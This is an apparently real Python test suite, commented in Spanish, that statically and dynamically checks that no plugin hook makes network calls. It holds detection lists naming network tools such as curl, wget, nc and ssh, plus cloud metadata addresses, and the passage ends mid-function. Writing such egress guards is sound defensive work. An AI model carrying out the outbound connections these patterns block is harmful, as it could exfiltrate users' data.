#!/usr/bin/env python3
"""Suite «ningun hook hace red» (antes parte de la regresion de seguridad de la memoria Graphiti,
retirada en plugin-audit-2 T-08; ver `docs/roadmap/2026-11-10-plugin-audit-2/testing/retirada.md`).

Pina, con tests PROPIOS y desde la raiz del repo, el invariante que la spec declara fuera de
alcance y que un cambio futuro podria romper en silencio: **ninguna llamada de red desde hooks**.
Ningun script alcanzable desde `hooks/hooks.json` -recorrido TRANSITIVO de los `.sh`/`.py` que
cita el CODIGO, no los comentarios- importa `urllib.request`/`http.client`/`socket` con fines de
conexion, ni invoca `knowledge-sync.py`/`capabilities.py`, ni pasa `--intent`/`--backends-dir` a
`knowledge-find.py`; ademas, el argv REAL que `hooks/session-context.sh` le pasa no llega a
`cargar_adaptador` (espia vivo, no solo lectura estatica). Tambien la cargan
`tests/test_hook_launcher_security.py` y `tests/hook-budget.test.mjs`.

Ejecutar: python -m pytest -q tests/test_hook_network_egress.py
"""
import ast
import hashlib
import importlib.util
import json
import os
import re
import shutil
import socket
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOOKS_JSON = os.path.join(ROOT, "hooks", "hooks.json")
SHARED = os.path.join(ROOT, "agent-kits", "shared")
KS_BACKENDS = os.path.join(ROOT, "skills", "knowledge-services", "backends")


def _cargar(ruta, nombre):
    spec = importlib.util.spec_from_file_location(nombre, ruta)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[nombre] = mod
    spec.loader.exec_module(mod)
    return mod


_hook_security = sys.modules.get("custom_agents_hook_security_support") or _cargar(
    os.path.join(ROOT, "tests", "hook_security_support.py"), "custom_agents_hook_security_support")


kf = _cargar(os.path.join(SHARED, "knowledge-find.py"), "kf_seguridad")


# ====================================================================== 1. sin red desde hooks

_TERMINOS_RED = ("urllib", "urlopen", "http.client", "httpx", "requests.", "socket.socket",
                 "socket.create_connection", "curl ", "wget ", "invoke-webrequest",
                 # gap #155: una cadena INLINE de un hook no es python, asi que el termino
                 # peligroso puede ser un binario o una IP a pelo (IMDS de nube).
                 "169.254.169.254", "metadata.google.internal")
# Binarios de red que solo tienen sentido en una cadena INLINE (no son python): se buscan
# TOKENIZANDO, no como subcadena (`nc ` casaria dentro de `sync `, `func `...).
_BINARIOS_DE_RED = {"curl", "wget", "nc", "ncat", "telnet", "ssh", "scp", "invoke-webrequest"}
_MODULOS_RED = {"urllib", "urllib.request", "http.client", "httplib", "socket",
                "requests", "httpx", "ssl"}
# Los dos scripts que los hooks SI invocan y que definen en su propio argparse los flags
# prohibidos: la prohibicion es para quien los LLAMA, no para la herramienta que los declara.
_HERRAMIENTAS = {"knowledge-find.py", "capabilities.py"}
_MAX_SALTOS = 5
# Gap #177 (Minor, fix2 Fase 4): la puerta solo sabe ESCANEAR `.py` y `.sh`; una cita a otro
# ejecutable (`node "…/hooks/exfil.js"`, un `.ps1`, un `.cmd`) no se recorria NI contaba como cita
# sin resolver, asi que la lista blanca vacia no estaba impuesta. Ahora esas citas se reconocen y
# son FALLO salvo que esten en `_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS` (vacia a proposito).
_EXT_ESCANEABLES = ("py", "sh")
_EXT_NO_ESCANEABLES = ("js", "mjs", "ps1", "cmd")
_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS = ()
# Reviewed full inline bootstraps, not arbitrary `.join(root, 'hooks', name)`.
# Changes to these commands require a deliberate security review and new fingerprints.
_BOOTSTRAP_NODE_HASHES = {
    "d496e3e458dae7e9f20ecad2474c172b3a6dac6c52b3062cb0989ab76cafa961",
    "bb33644a5fa25a3f796135a0e540d48fc232daed161e1c0c41af3059c246bf0e",
}
# The scanner admits exactly the audited launcher, not arbitrary JavaScript.
# Normalize only line endings; a code change must update this fingerprint after review.
# F1 T-02/T-03: bounded local role-map/input prefilter, monotonic deadline and isolated
# prompt capture; same local executables/imports, no network path (review 2026-10-29).
# F2 T-09/T-10: fixed local marker and combined local parser only; self-audit in
# testing/t10-egress-boundary-review-2026-10-29.json. Independent phase review remains T-19.
_LAUNCHER_NODE_HASH = "d4b32aa9b129595d9ed1858d4dd3049a8d473d094b34012e60557e372322a300"   # revisado 2026-11-17 (T-23 fix17): la confirmacion de limpieza de OpenCode toma lo que queda de la ventana de 20 s del catalogo (cleanupConfirmationMs, tope 10 s, minimo 250 ms); solo aritmetica de plazos, ningun import, proceso ni red nuevos; revisado 2026-11-16 (T-23 fix16): el presupuesto del hijo de captura de OpenCode (8000 ms) y la confirmacion de limpieza de los hooks informativos de OpenCode (10000 ms en lugar de 500 ms; el guard y los demas runtimes conservan 500 ms); ningun import, proceso ni red nuevos; ningun import, proceso ni red nuevos; revisado 2026-11-15 (T-06 fix10): la clave del rol se busca con la clase explicita de blancos de JSON (espacio, tabulador, LF y CR) en vez de la clase de espacios del motor, igual que el adaptador Python; solo cambia el patron de la regex (sin red ni procesos nuevos); revisado 2026-11-14 (T-06 fix8): el lanzador busca la clave del rol en TODO el flujo con una ventana deslizante de memoria constante, sin tope de tamaño (regex lineal sobre cada fragmento; sin red ni procesos nuevos); revisado 2026-11-14 (T-06 fix7): el lanzador retiene hasta 16 MiB de la entrada para hallar la clave del rol (regex lineal, sin red ni procesos nuevos) y deniega sin arrancar el hijo; revisado 2026-11-13 (T-06 fix6): falla cerrado para el rol protegido (lee el mapa de roles local con readFileSync; sin red); revisado 2026-11-10 (T-14): JOB_EMPTY del supervisor y subagent-progress.py/journal-prompt.py locales, sin red
_EXT_RE = "|".join(_EXT_ESCANEABLES + _EXT_NO_ESCANEABLES)
# Gap #155 (Important, fix1 Fase 4): el lookahead final quita los falsos positivos del escaneo de
# CODIGO (`hashlib.sha256` casaba como `hashlib.sh`). Hace falta porque a partir de este fix una
# cita que no resuelve YA NO se descarta en silencio: es un fallo. Gap #182 (fix2): el prefijo
# opcional `$VAR/` o `${VAR:-…}/` se captura aparte (`var`), porque sin fallback por basename una
# cita `"$SHARED/journal.py"` solo se puede resolver sabiendo a que apunta `SHARED`.
_RUTA_RE = re.compile(r"""(?:\$\{?(?P<var>\w+)[^}\s"'/]*\}?)?(?P<ruta>[\w./\\-]+\.(?:%s))(?![\w.])"""
                      % _EXT_RE)
# Token de una cita dentro de una cadena de shell (`bash "${X}/hooks/a.sh"`, `python3 "$S/b.py"`).
_TOKEN_SCRIPT_RE = re.compile(r"""[^\s"'`;|&()]*\.(?:%s)(?![\w.])""" % _EXT_RE)
_EXPANSION_SHELL_RE = re.compile(r"\$\{[^}]*\}|\$\w+")
# Lista blanca EXPLICITA de citas que no corresponden a un fichero del repo. Vacia a proposito:
# todo hook del plugin invoca scripts del plugin. Añadir una entrada aqui es una decision
# consciente y revisable, no el descarte silencioso que encontro el gap #155.
_CITAS_SIN_FICHERO_PERMITIDAS = ()
# Gap #182 (Minor, fix2 Fase 4): `_resolver` ya NO busca por basename en carpetas «probables» (una
# cita a `agent-kits/implementer/tools/journal.py`, que no existe, acababa leyendo el `journal.py`
# de `shared/`). Una cita se resuelve SOLO por su ruta literal: relativa a la raiz del repo (o a
# `${CLAUDE_PLUGIN_ROOT}`), relativa al directorio del fichero que la cita, o tras expandir una
# variable asignada en el propio `.sh`. Las citas del repo que nombran un script SIN ruta -porque
# el directorio va en una variable de Python (`os.path.join(shared, "knowledge-find.py")`)- se
# declaran aqui UNA A UNA: `(fichero que cita, nombre citado) -> destino`.
_CITAS_POR_NOMBRE = {
    ("hooks/run-hook.mjs", "journal.py"): "agent-kits/shared/journal.py",
    ("hooks/run-hook.mjs", "journal-capture.py"): "agent-kits/shared/journal-capture.py",
    ("hooks/run-hook.mjs", "journal-prompt.py"): "agent-kits/shared/journal-prompt.py",   # T-14 (H-31)
    ("hooks/run-hook.mjs", "native-guardrail.py"): "agent-kits/shared/native-guardrail.py",
    ("hooks/run-hook.mjs", "agent-activity-store.py"): "agent-kits/shared/agent-activity-store.py",
    ("hooks/run-hook.mjs", "ledger-post.py"): "hooks/ledger-post.py",
    ("hooks/run-hook.mjs", "session-context.py"): "hooks/session-context.py",
    ("hooks/session-context.py", "journal.py"): "agent-kits/shared/journal.py",
    ("hooks/session-context.py", "skill-index.py"): "agent-kits/shared/skill-index.py",
    ("hooks/session-context.py", "progress-report.py"): "agent-kits/shared/progress-report.py",
    ("hooks/session-context.py", "knowledge-find.py"): "agent-kits/shared/knowledge-find.py",
    ("hooks/subagent-progress.py", "progress-report.py"): "agent-kits/shared/progress-report.py",   # T-14 (H-30)
    ("hooks/ledger-post.py", "ledger-lint.py"): "agent-kits/shared/ledger-lint.py",
    ("hooks/ledger-post.py", "progress-report.py"): "agent-kits/shared/progress-report.py",
    ("hooks/ledger-post.py", "local-read.py"): "agent-kits/shared/local-read.py",
    ("hooks/ledger-post.py", "local-state.py"): "agent-kits/shared/local-state.py",
    ("hooks/ledger-post.py", "redact.py"): "agent-kits/shared/redact.py",
    ("hooks/session-context.sh", "knowledge-find.py"): "agent-kits/shared/knowledge-find.py",
    ("hooks/session-context.sh", "progress-report.py"): "agent-kits/shared/progress-report.py",
    ("agent-kits/shared/knowledge-find.py", "__init__.py"):
        "skills/knowledge-services/backends/__init__.py",
    ("agent-kits/shared/knowledge-find.py", "session-context.sh"): "hooks/session-context.sh",
}
# This reviewed owner constructs .py paths in _load(filename); text citations cannot
# prove those edges. Pin the entire owner, then traverse its three real local modules.
# This is a closure declaration, never an egress exception. Any owner change needs review.
_CARGAS_LOCALES_REVISADAS = {
    "hooks/session-context.py": {
        "sha256_lf": "5180cec9d7297a4f47f467154900360ce974c22439717511cc92e1c9e21e665b",   # f4fix3 (gaps 1 y 5): modo `drain` (solo replay); token SHAREDKIT neutralizado salvo tras `$` (expansión, no asignación); el token SHAREDKIT del consumidor se neutraliza sin distinguir mayúsculas ni forma; f4fix2 (gap 1): el texto del consumidor se neutraliza (`neutralise_kit_text`), solo vale la línea del hook; f4fix1 (gaps 1 y 17): la línea «Kit activo» va entre comillas simples (CWE-78) y también con el bloque vacío; T-19 (H-45): línea «Kit activo» con la ruta local del bundle; T-13 (H-28): título y corpus de la memoria sin releer; mismas cargas locales, sin red
        "dependencies": ("agent-kits/shared/journal.py", "agent-kits/shared/skill-index.py",
                         "agent-kits/shared/progress-report.py", "agent-kits/shared/knowledge-find.py"),
    },
    "hooks/ledger-post.py": {
        "sha256_lf": "d973901509c4ae0a14fc609334ba29eb7df636921971c5c11c86d288f2f89013",   # fase 3 fix1 (B-nota): último estado por hook; mismas cargas locales, sin red
        "dependencies": ("agent-kits/shared/ledger-lint.py", "agent-kits/shared/progress-report.py",
                         "agent-kits/shared/local-read.py", "agent-kits/shared/local-state.py",
                         "agent-kits/shared/redact.py"),
    },
    "agent-kits/shared/agent-activity-store.py": {
        "sha256_lf": "e381f4c30890471d8288636aeac02a451d93ffb74cd6ca8ba681e2bb162bcf6e",   # T-40: bounded local task transition history alongside hook events, same imports and no network;  T-23 fix24 (gaps 1, 2, 3, 12): sello de configuracion en cada linea de la cola, vista recortada (`_view`), lectura cola->anillo y linea cortada tolerada; revisado el diff: sin imports ni cargas nuevas (mismas `local-read`, `local-state`, `agent-activity`, `redact`) y sin red. T-06 fix18d/fix20 (D2): validacion previa sin cerrojo (`_prepare_tool_event`, firmas `stat` dentro) y espera del cerrojo desde el fin de la preparacion; sin cargas locales nuevas (mismas `local-read`, `local-state`, `agent-activity`, `redact`; revisado el diff: ni import, ni importlib, ni exec) y sin red. T-23 fix18 (gap 4, D2): cola `events.tail` (append + fsync sin releer el anillo, pliegue por CAS, `fold_tail`); mismas cargas locales (`local-read`, `local-state`, `agent-activity`, `redact`), sin red (la cola guarda solo seudónimos, nunca la sesión ni el agente en claro); T-23 fix6: la escala solo actúa con PYTEST_CURRENT_TEST (no en producción); T-23 fix5: escala de plazos por entorno (`CUSTOM_AGENTS_ACTIVITY_DEADLINE_SCALE`, solo lectura de `os.environ`); mismas cargas locales, sin red
        "dependencies": ("agent-kits/shared/local-read.py", "agent-kits/shared/local-state.py",
                         "agent-kits/shared/agent-activity.py", "agent-kits/shared/redact.py"),
    },
}
_VARIABLES_DE_RAIZ = ("CLAUDE_PLUGIN_ROOT", "CLAUDE_PROJECT_DIR")
# Gap #173 (Important, fix2 Fase 4): los binarios de red se buscaban como TOKEN solo en las cadenas
# inline; en el codigo de un script alcanzable, `subprocess.run(["curl", "-s", URL])` (lista: sin la
# subcadena `"curl "` tras `ast.unparse`) pasaba. Ahora el AST de cada `.py` alcanzable mira los
# argv literales (lista/tupla cuyo primer elemento es un binario), las cadenas de shell que se
# pasan a `subprocess.*`/`os.system`/`os.popen`/`os.exec*`/`os.spawn*`/`Popen` y el CLI `claude`
# (`which("claude")`, `[exe, "-p", ...]`): lanzar `claude -p` es egress hacia la API.
_BINARIOS_DE_EGRESS = _BINARIOS_DE_RED | {"claude"}
_SHELLS = {"sh", "bash", "zsh", "dash", "cmd", "powershell", "pwsh"}
_FUNCIONES_QUE_EJECUTAN = {"system", "popen", "run", "call", "check_call", "check_output",
                           "Popen", "getoutput", "getstatusoutput", "create_subprocess_exec",
                           "create_subprocess_shell"}
_PREFIJOS_QUE_EJECUTAN = ("exec", "spawn")
# Excepcion NOMINAL al invariante «ninguna llamada de red desde hooks» (gap #173, conciliada en
# `design.md`): el resumen IA del journal de sesion lanza `claude -p --bare` SOLO con `dev.json`
# `sesion.resumen: true` (ADR-010 revisado, ADR-013). Vale para ESTE fichero y ESTOS motivos, y
# solo mientras `_egress_del_journal_sin_condicion` no encuentre nada: si la guardia desaparece, la
# excepcion deja de aplicarse y la puerta se pone roja.
_EGRESS_OPT_IN_DECLARADO = {
    "agent-kits/shared/journal.py": {
        "motivos": ("ejecutable claude", "argv <variable> -p"),
        "condicion": "`dev.json` sesion.resumen: true (`ia_activa`) o `--ia on` explicito, que "
                     "ningun hook pasa",
        "decision": "ADR-010 revisado / ADR-013; design.md, enmienda fix2 Fase 4",
    },
}
_FLAGS_QUE_CARGAN_ADAPTADOR = ("--intent", "--backends-dir")
_SCRIPTS_CON_RED = ("knowledge-sync.py", "capabilities.py")


def _texto(ruta):
    with open(ruta, "rb") as f:
        crudo = f.read()
    try:
        return crudo.decode("utf-8")
    except UnicodeDecodeError as e:          # nunca un skip silencioso
        raise AssertionError("`%s` no decodifica en UTF-8: %s" % (ruta, e)) from e


def _sin_docstrings(arbol):
    """Quita TODA sentencia-expresion de cadena (docstrings incluidos): un docstring que MENCIONE
    `urllib` o `knowledge-sync.py` no es una llamada de red (los comentarios ya no sobreviven al
    parseo del AST)."""
    for nodo in ast.walk(arbol):
        cuerpo = getattr(nodo, "body", None)
        if isinstance(cuerpo, list):
            nodo.body = [s for s in cuerpo
                         if not (isinstance(s, ast.Expr) and isinstance(s.value, ast.Constant)
                                 and isinstance(s.value.value, str))] or [ast.Pass()]
    return arbol


def _codigo(ruta):
    """Texto de CODIGO del fichero, sin comentarios ni docstrings. `.py` se reescribe desde el AST;
    `.sh` pierde sus lineas de comentario (incluidos los heredoc de python que llevan dentro)."""
    texto = _texto(ruta)
    if ruta.endswith(".py"):
        try:
            return ast.unparse(_sin_docstrings(ast.parse(texto)))
        except SyntaxError as e:
            raise AssertionError("`%s` no parsea: %s" % (ruta, e)) from e
    return "\n".join(_sin_comentario_shell(l) for l in texto.splitlines())


def _sin_comentario_shell(cadena):
    """Gap #183 (Minor, fix2 Fase 4): quita el comentario FINAL de cada linea de shell (`… # nota:
    no usamos ssh` daba `ssh` como binario de red). Gap #186 (regresion de fix2, fix3): se corta
    LINEA A LINEA; antes el primer `#` de una cadena multilinea tapaba tambien las lineas
    siguientes (`echo ok # x` + salto + `curl …` -> 0 motivos)."""
    return chr(10).join(_sin_comentario_de_linea(l) for l in cadena.split(chr(10)))


def _sin_comentario_de_linea(linea):
    """Un `#` solo abre comentario fuera de comillas y al principio de palabra (tras blanco, `;`,
    `|`, `&` o `(`): `${#ARR[@]}`, `$#`, `a#b` y `"… # …"` no son comentarios. Ante comillas
    desparejadas no corta (conservador: mas texto que escanear, nunca menos)."""
    comilla = None
    for i, c in enumerate(linea):
        if comilla:
            if c == comilla and (comilla == "'" or i == 0 or linea[i - 1] != chr(92)):
                comilla = None
        elif c in "'\"":
            comilla = c
        elif c == "#" and (i == 0 or linea[i - 1] in " \t;|&("):
            return linea[:i].rstrip()
    return linea


_IMPORT_NO_LITERAL = "<import dinamico no literal>"


def _modulos_importados(ruta):
    """Modulos que importa un `.py`. Gap #176 (Minor, fix2 Fase 4): `__import__("socket")` e
    `importlib.import_module("socket")` con nombre LITERAL cuentan como import; con un nombre que
    no es literal (`"sock" + "et"`, una variable) no se puede verificar y se marca
    `_IMPORT_NO_LITERAL`, que la puerta trata como FALLO."""
    if not ruta.endswith(".py"):
        return set()
    modulos = set()
    for nodo in ast.walk(ast.parse(_texto(ruta))):
        if isinstance(nodo, ast.Import):
            modulos |= {a.name for a in nodo.names}
        elif isinstance(nodo, ast.ImportFrom) and nodo.module:
            modulos.add(nodo.module)
        elif isinstance(nodo, ast.Call) and _nombre_llamada(nodo) in ("__import__", "import_module"):
            primero = nodo.args[0] if nodo.args else None
            if isinstance(primero, ast.Constant) and isinstance(primero.value, str):
                modulos.add(primero.value)
            else:
                modulos.add(_IMPORT_NO_LITERAL)
    return modulos


def _nombre_llamada(nodo):
    """Ultimo componente del nombre de la funcion llamada (`subprocess.run` -> `run`)."""
    funcion = nodo.func
    if isinstance(funcion, ast.Attribute):
        return funcion.attr
    if isinstance(funcion, ast.Name):
        return funcion.id
    return ""


def _binario(valor):
    base = os.path.basename(valor.replace(chr(92), "/")).lower()
    return base[:-4] if base.endswith(".exe") else base


def _tokens_de_shell(cadena):
    return [t.strip("/" + chr(92)) for t in re.split(r"""[\s;|&()"'`]+""",
                                                    _sin_comentario_shell(cadena).lower()) if t]


def _literal(nodo):
    return nodo.value if isinstance(nodo, ast.Constant) and isinstance(nodo.value, str) else None


def _datos_runtime_del_ast(arbol):
    """Admit only proven runtime enums used as comparisons or real argparse choices.

    Unknown receivers, escaped constants, shadowing and method rebinding keep
    the conservative argv classification. This is a static check, not a sandbox.
    """
    nodes = list(ast.walk(arbol))
    parents = {child: parent for parent in nodes for child in ast.iter_child_nodes(parent)}
    # Namespace declarations can redirect ordinary assignments outside scope(node).
    # Deny parser authority for affected names rather than model Python namespaces.
    namespace_declared_names = {name for node in nodes
                                if isinstance(node, (ast.Global, ast.Nonlocal))
                                for name in node.names}

    def scope(node):
        while node in parents:
            node = parents[node]
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)):
                return node
        return arbol

    bindings, invalid = {}, set()
    for node in nodes:
        if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
            parent = parents.get(node)
            key = (scope(node), node.id)
            if isinstance(parent, ast.Assign) and parent.targets == [node]:
                bindings.setdefault(key, []).append(parent.value)
            else:
                invalid.add(key)
        elif isinstance(node, ast.arg):
            invalid.add((scope(node), node.arg))
        elif isinstance(node, ast.Attribute) and isinstance(node.ctx, (ast.Store, ast.Del)):
            base = node
            while isinstance(base, ast.Attribute):
                base = base.value
            if isinstance(base, ast.Name):
                invalid.add((scope(node), base.id))

    # Any attribute write can replace a parser's methods or effective class,
    # including through aliases and custom setters. Keep argv classification
    # whenever the module contains such mutations; comparisons stay data.
    # This conservative static guard does not claim a Python sandbox.
    attributes_mutated = any(
        isinstance(node, ast.Attribute)
        and isinstance(node.ctx, (ast.Store, ast.Del))
        or isinstance(node, ast.Call)
        and _nombre_llamada(node) in {'setattr', 'delattr'}
        for node in nodes
    )

    argparse_bindings = {(scope(node), alias.asname or alias.name)
                         for node in nodes if isinstance(node, ast.Import)
                         for alias in node.names if alias.name == 'argparse'}
    argparse_names = {name for _scope, name in argparse_bindings}
    # Definitions bind names too; they must never masquerade as imported modules.
    argparse_names -= {node.name for node in nodes
                       if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))}
    argparse_names = {name for name in argparse_names
                      if not any(isinstance(node, ast.Name) and node.id == name
                                 and isinstance(node.ctx, (ast.Store, ast.Del)) for node in nodes)
                      and not any(isinstance(node, ast.arg) and node.arg == name for node in nodes)}

    argparse_names -= {name for _scope, name in invalid}
    argparse_names -= namespace_declared_names
    for node in nodes:
        if isinstance(node, ast.Import):
            argparse_names -= {alias.asname or alias.name.split('.')[0] for alias in node.names
                              if alias.name != 'argparse'}
        elif isinstance(node, ast.ImportFrom):
            argparse_names -= {alias.asname or alias.name for alias in node.names}

    def argparse_available(node, name):
        return name in argparse_names and ((scope(node), name) in argparse_bindings
                                           or (arbol, name) in argparse_bindings)

    # A local quiet parser changes only error presentation, never add_argument.
    # Require the exact reviewed error body and an unshadowed builtin; other
    # subclasses, decorators, extra methods and namespace mutations stay argv.
    quiet_error = ast.parse("def error(self, message):\n    raise ValueError('invalid_arguments')\n").body[0]
    value_error_shadowed = any(
        isinstance(node, ast.Name) and node.id == 'ValueError' and isinstance(node.ctx, (ast.Store, ast.Del))
        or isinstance(node, ast.arg) and node.arg == 'ValueError'
        or isinstance(node, (ast.FunctionDef, ast.ClassDef)) and node.name == 'ValueError'
        or isinstance(node, (ast.Import, ast.ImportFrom)) and any(
            (alias.asname or alias.name.split('.')[0]) == 'ValueError' for alias in node.names)
        for node in nodes)
    classes = {}
    for node in nodes:
        if isinstance(node, ast.ClassDef):
            classes.setdefault((scope(node), node.name), []).append(node)
    # Conservative across scopes: a function/import of the same nominal name
    # invalidates that quiet class. Do not adopt an alias or a factory as parser.
    quiet_rebound_names = {node.name for node in nodes
                           if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))}
    quiet_rebound_names |= {alias.asname or alias.name.split('.')[0]
                            for node in nodes if isinstance(node, (ast.Import, ast.ImportFrom))
                            for alias in node.names}
    quiet_classes = set()
    for key, definitions in classes.items():
        node = definitions[0]
        base = node.bases[0] if len(node.bases) == 1 else None
        if (len(definitions) == 1 and key[1] not in quiet_rebound_names
                and key[1] not in namespace_declared_names
                and not value_error_shadowed and not node.decorator_list
                and not node.keywords and not getattr(node, 'type_params', [])
                and len(node.body) == 1 and ast.dump(node.body[0]) == ast.dump(quiet_error)
                and isinstance(base, ast.Attribute) and base.attr == 'ArgumentParser'
                and isinstance(base.value, ast.Name) and argparse_available(node, base.value.id)
                and key not in bindings and key not in invalid):
            quiet_classes.add(key)

    nominal_bindings = set(classes)
    nominal_bindings |= {(scope(node), node.name) for node in nodes
                         if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))}
    nominal_bindings |= {(scope(node), alias.asname or alias.name.split('.')[0])
                         for node in nodes if isinstance(node, (ast.Import, ast.ImportFrom))
                         for alias in node.names}

    def module_fallback_safe(node, name):
        # Never skip an enclosing lexical binding to adopt module authority.
        # Outer bindings remain conservative argv, including otherwise quiet classes.
        current = scope(node)
        while current is not arbol:
            key = (current, name)
            if key in bindings or key in invalid or key in nominal_bindings:
                return False
            current = scope(current)
        return True

    def parser_kind(node, active=frozenset()):
        if attributes_mutated:
            return None
        if isinstance(node, ast.Name):
            if node.id in namespace_declared_names:
                return None
            key = (scope(node), node.id)
            if key not in bindings and key not in invalid:
                if not module_fallback_safe(node, node.id):
                    return None
                key = (arbol, node.id)
            if key in invalid or key in active or key not in bindings:
                return None
            kinds = {parser_kind(value, active | {key}) for value in bindings[key]}
            return next(iter(kinds)) if len(kinds) == 1 and None not in kinds else None
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id in namespace_declared_names:
                return None
            key = (scope(node), node.func.id)
            # Local parameters/assignments/unknown classes shadow a global class.
            # Check the current binding before considering the module fallback.
            if key in invalid or key in bindings or (key in classes and key not in quiet_classes):
                return None
            if key not in quiet_classes:
                if not module_fallback_safe(node, node.func.id):
                    return None
                key = (arbol, node.func.id)
            if key in quiet_classes and key not in invalid and key not in bindings:
                return 'parser'
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            method, receiver = node.func.attr, node.func.value
            if method == 'ArgumentParser' and isinstance(receiver, ast.Name) and argparse_available(node, receiver.id):
                return 'parser'
            kind = parser_kind(receiver, active)
            if method == 'add_subparsers' and kind == 'parser':
                return 'subparsers'
            if method == 'add_parser' and kind == 'subparsers':
                return 'parser'
        return None

    def data_use(node):
        parent = parents.get(node)
        if isinstance(parent, ast.Compare):
            return any(comparator is node and isinstance(operator, (ast.In, ast.NotIn))
                       for operator, comparator in zip(parent.ops, parent.comparators))
        call = parents.get(parent)
        return (isinstance(parent, ast.keyword) and parent.arg == 'choices'
                and isinstance(call, ast.Call) and isinstance(call.func, ast.Attribute)
                and call.func.attr == 'add_argument' and parser_kind(call.func.value) == 'parser')

    data = set()
    for node in nodes:
        if not isinstance(node, (ast.List, ast.Tuple)):
            continue
        values = [_literal(item) for item in node.elts]
        if (not values or len(set(values)) != len(values)
                or any(value not in ('claude', 'codex', 'opencode') for value in values)):
            continue
        if data_use(node):
            data.add(node)
            continue
        parent = parents.get(node)
        if not (isinstance(parent, ast.Assign) and parents.get(parent) is arbol
                and len(parent.targets) == 1 and isinstance(parent.targets[0], ast.Name)):
            continue
        name = parent.targets[0].id
        stores = [item for item in nodes if isinstance(item, ast.Name) and item.id == name
                  and isinstance(item.ctx, (ast.Store, ast.Del))]
        loads = [item for item in nodes if isinstance(item, ast.Name) and item.id == name
                 and isinstance(item.ctx, ast.Load)]
        if (stores == parent.targets and loads and all(data_use(item) for item in loads)
                and not any(isinstance(item, ast.arg) and item.arg == name for item in nodes)):
            data.add(node)
    return data


def _codigo_red_python(ruta, original):
    if not ruta or not ruta.endswith('.py'):
        return original
    return _hook_security.local_urlparse_code(original)


def _egress_por_ast(ruta):
    """Gap #173: motivos de egress en el CODIGO de un `.py` (no en sus comentarios/docstrings):
    `argv <binario>` (lista/tupla literal que arranca por un binario de red o por `claude`),
    `shell <binario>` (cadena de shell pasada a una funcion que ejecuta, o tras `sh -c`),
    `exec <binario>` (`os.exec*`/`os.spawn*` con la ruta literal), `ejecutable claude` (el literal
    `"claude"` como argumento, p. ej. `shutil.which("claude")`) y `argv <variable> -p` (argv cuyo
    ejecutable es una variable con el `-p` del CLI headless)."""
    if not ruta.endswith(".py"):
        return []
    motivos = []
    arbol = _sin_docstrings(ast.parse(_texto(ruta)))
    datos_runtime = _datos_runtime_del_ast(arbol)
    for nodo in ast.walk(arbol):
        if isinstance(nodo, (ast.List, ast.Tuple)) and nodo.elts:
            if nodo in datos_runtime:
                continue
            elementos = [_literal(e) for e in nodo.elts]
            if elementos[0] is not None:
                binario = _binario(elementos[0])
                if binario in _BINARIOS_DE_EGRESS:
                    motivos.append("argv " + binario)
                elif binario in _SHELLS:
                    for cadena in elementos[1:]:
                        if cadena and cadena.lower() not in ("-c", "/c", "-command"):
                            motivos += ["shell " + t for t in _tokens_de_shell(cadena)
                                        if t in _BINARIOS_DE_EGRESS]
            elif "-p" in elementos:
                motivos.append("argv <variable> -p")
        elif isinstance(nodo, ast.Call):
            nombre = _nombre_llamada(nodo)
            literales = [_literal(a) for a in nodo.args]
            if "claude" in [(_binario(l) if l else None) for l in literales]:
                motivos.append("ejecutable claude")
            ejecuta = (nombre in _FUNCIONES_QUE_EJECUTAN
                       or nombre.startswith(_PREFIJOS_QUE_EJECUTAN))
            if ejecuta and literales and literales[0] is not None:
                if nombre.startswith(_PREFIJOS_QUE_EJECUTAN):
                    if _binario(literales[0]) in _BINARIOS_DE_EGRESS:
                        motivos.append("exec " + _binario(literales[0]))
                else:
                    motivos += ["shell " + t for t in _tokens_de_shell(literales[0])
                                if t in _BINARIOS_DE_EGRESS]
    return motivos


def _egress_del_journal_sin_condicion(texto):
    """Condicion de la excepcion nominal del journal (gap #173). Devuelve lo que la ROMPE (vacio =
    la excepcion se sostiene): `ia_activa` debe exigir `sesion.resumen` `is True`, y TODA llamada a
    `resumen_ia` debe ir dentro de un `if` que dependa de `ia_activa(root)`."""
    arbol = ast.parse(texto)
    problemas = []
    activa = [n for n in ast.walk(arbol) if isinstance(n, ast.FunctionDef) and n.name == "ia_activa"]
    if not activa or ".get('resumen') is True" not in ast.unparse(activa[0]):
        problemas.append("`ia_activa` ya no exige `sesion.resumen` `is True`")
    padres = {}
    for padre in ast.walk(arbol):
        for hijo in ast.iter_child_nodes(padre):
            padres[hijo] = padre
    for nodo in ast.walk(arbol):
        if isinstance(nodo, ast.Call) and _nombre_llamada(nodo) == "resumen_ia":
            actual, guardado = nodo, False
            while actual in padres:
                actual = padres[actual]
                if isinstance(actual, ast.If) and "ia_activa(root)" in ast.unparse(actual.test):
                    guardado = True
                    break
            if not guardado:
                problemas.append("`resumen_ia` en la linea %d no depende de `ia_activa(root)`"
                                 % nodo.lineno)
    return problemas


def _resolver(ruta_rel, root=ROOT, citante=None):
    """Ruta real de un script citado, SOLO por su ruta literal (gap #182: sin fallback por
    basename): relativa a la raiz del repo (lo que queda de `${CLAUDE_PLUGIN_ROOT}/…`), relativa al
    directorio del fichero que la cita (`$(dirname "$0")/x.sh`, `os.path.join(aqui, "x.py")`) o,
    para un nombre sin ruta, por la tabla nominal `_CITAS_POR_NOMBRE`. Nunca fuera de la raiz."""
    ruta_rel = ruta_rel.replace("\\", "/").lstrip("$")
    # patron de `find -path "*hooks/x.sh"` (el fallback de la regla 5): la parte tras el ultimo
    # comodin ES la ruta literal relativa a la raiz del plugin
    relativa = ruta_rel.rsplit("*", 1)[-1].lstrip("/")
    if not relativa or relativa.lower() in tuple("." + e for e in _EXT_ESCANEABLES + _EXT_NO_ESCANEABLES):
        return None                       # cita vacia: lo que queda de `${BASE}.py` (gap #155)
    raiz = os.path.normpath(root)
    bases = [root] + ([os.path.dirname(citante)] if citante else [])
    for base in bases:
